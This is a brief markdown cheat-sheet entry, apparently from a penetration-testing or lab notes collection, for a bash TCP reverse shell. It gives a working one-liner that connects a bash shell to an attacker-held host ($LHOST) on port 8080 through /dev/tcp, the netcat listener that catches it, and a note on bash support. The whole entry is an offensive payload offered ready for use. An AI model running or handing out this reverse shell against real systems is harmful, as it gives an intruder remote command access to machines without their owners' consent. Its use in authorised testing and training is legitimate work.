# Bash Reverse Shell

A standard bash TCP reverse shell one-liner.

Used on: **<Machine>**

## One-liner

<!-- cmd: linux -->
```bash
bash -i >& /dev/tcp/$LHOST/8080 0>&1
```

## Listener

<!-- cmd: linux -->
```bash
nc -lvnp 8080
```

## Notes

- Assumes bash is available and compiled with `/dev/tcp` support.